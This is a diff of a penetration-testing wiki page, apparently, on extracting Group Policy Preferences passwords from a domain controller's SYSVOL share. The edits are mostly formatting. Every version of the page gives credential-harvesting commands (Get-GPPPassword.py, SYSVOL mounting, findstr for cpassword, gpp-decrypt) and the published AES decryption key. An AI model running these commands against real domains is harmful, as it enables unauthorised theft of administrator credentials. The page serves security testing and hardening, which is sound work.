@@ -2,11 +2,11 @@
 
 Windows systems come with a built-in Administrator (with an RID of 500) that most organizations want to change the password of. This can be achieved in multiple ways but there is one that is to be avoided: setting the built-in Administrator's password through Group Policies.
 
-The first problem is that the password is set to be the same for every (set of) machine(s) the Group Policy applies to. If the attacker finds the admin's hash or password, he can gain administrative access to all (or set of) machines. by default, knowing the built-in Administrator's hash (RID 500) allows for powerful attackss. all Group Policies are stored in the Domain Controllers' SYSVOL share. All domain users have read access to it. This means all domain users can read the encrypted password set in Group Policy Preferences, and since Microsoft published the encryption key around 2012, the password can be decrypted.
+The first problem is that the password is set to be the same for every (set of) machine(s) the Group Policy applies to. If the attacker finds the admin's hash or password, he can gain administrative access to all (or set of) machines. by default, knowing the built-in Administrator's hash (RID 500) allows for powerful attacks. <mark style="color:green;">**all Group Policies are stored in the Domain Controllers' SYSVOL share. All domain users have read access to it. This means all domain users can read the encrypted password set in Group Policy Preferences, and since Microsoft published the encryption key around 2012, the password can be decrypted.**</mark>
 
 From UNIX-like systems, [this python script](https://github.com/SecureAuthCorp/impacket/blob/master/examples/Get-GPPPassword.py) in the impacket examples can be used to remotely parse .xml files and loot for passwords
 
-```
+```powershell
 # with a NULL session
 Get-GPPPassword.py -no-pass 'DOMAIN_CONTROLLER'
 ​
@@ -19,7 +19,7 @@ Get-GPPPassword.py -hashes 'LMhash':'NThash' 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_
 
 Alternatively, searching for passwords can be done manually (or with Metasploit's smb\_enum\_gpp module), however it requires mounting the SYSVOL share, which can't be done through a docker environment unless it's run with privileged rights. Tools like pypykatz and gpp-decrypt can then be used to decrypt the matches.
 
-```
+```tsconfig
 # create the target directory for the mount
 sudo mkdir /tmp/sysvol
 ​
@@ -42,20 +42,20 @@ gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
 
 From Windows systems, the GPP password can only be recovered from an authenticated (i.e. domain user) context. ​powersploit's `get-gpppassword` searches a Domain Controller's SYSVOL share Groups.xml, Services.xml, Scheduledtasks.xml, DataSources.xml, Printers.xml and Drives.xml files and returns plaintext passwords
 
-```
+```powershell
 Import-Module .\Get-GPPPassword.ps1
 Get-GPPPassword
 ```
 
 This can also be achieved without tools, by "manually" looking for the cpassword string in xml files and by then manually decrypting the matches
 
-```
+```powershell
 findstr /S cpassword %logonserver%\sysvol\*.xml
 ```
 
 The decryption process is as follows
 
-```
+```powershell
 1. decode from base64
 2. decrypt from AES-256-CBC the following hex key/iv
     Key : 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b
